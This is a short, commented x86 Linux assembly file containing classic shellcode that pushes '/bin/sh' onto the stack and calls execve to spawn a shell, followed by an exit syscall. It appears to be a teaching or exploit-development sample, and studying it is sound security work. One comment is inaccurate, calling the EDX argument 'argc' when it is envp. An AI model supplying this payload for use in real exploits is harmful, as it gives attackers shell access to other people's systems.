global _start

section .text

_start:
	xor eax,eax ; Zeroes EAX register
	push eax ; Push NULL terminator into the stack
	push 0x68732f2f ; Push "hs//" into the stack
	push 0x6e69622f ; Push "nib/" into the stack
	mov ebx,esp ; Move "/bin/sh\x00" from the stack into EBX register

	; execve("/bin/sh",0,0);
	mov al,0xb  ; Syscall for execve
	xor ecx,ecx ; argv = NULL
	xor edx,edx ; argc = NULL
	int 0x80 ; Calls the kernel

	; exit(0) 
	xor eax,eax ; Zeroes EAX register
	inc eax ; Syscall nbr 1, EAX = 1
	xor ebx,ebx ; Exit nbr 0 
	int 0x80 ; Calls kernel
